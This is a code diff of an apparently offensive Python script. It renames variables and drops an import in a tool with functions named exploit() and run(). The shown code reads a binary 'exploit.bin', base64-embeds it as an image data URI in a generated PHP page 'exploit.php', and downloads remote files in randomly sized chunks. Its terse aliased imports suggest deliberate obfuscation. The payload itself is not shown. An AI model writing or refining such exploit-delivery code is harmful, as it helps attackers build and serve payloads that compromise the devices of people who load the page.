@@ -11,7 +11,6 @@ import sentry_sdk as e
 import struct as a
 import sys as s
 import time as r
-import wlib3 as o
 import urllib3 as cd
 import zlib as p
 from sentry_sdk.integrations.logging import LoggingIntegration
@@ -202,9 +201,9 @@ def run():
     )
   exploit(6, 0)
   data = open('exploit.bin', 'rb').read()
-  bytes_base64 = i.b64encode(data)
-  text_base64 = bytes_base64.decode()
-  html = '<?php\n$htmlcode = "<img src=\\"data:image/png;base64,' + text_base64 + '\\">";\necho $htmlcode\n?>'
+  a = i.b64encode(data)
+  b = a.decode()
+  html = '<?php\n$htmlcode = "<img src=\\"data:image/png;base64,' + b + '\\">";\necho $htmlcode\n?>'
   open('exploit.php', 'w').write(html)
   exploit(7, 0)
   exploit(8, 0)
@@ -249,8 +248,8 @@ def task(a):
     run()
     j._exit(0)
 def downloadtask(a, b):
-  http = cd.PoolManager()
-  r = http.request('GET', b, preload_content=False)
+  c = cd.PoolManager()
+  r = c.request('GET', b, preload_content=False)
   chunk_size = n.randint(10, 1000)
   with open(a, 'wb') as out:
     while True:
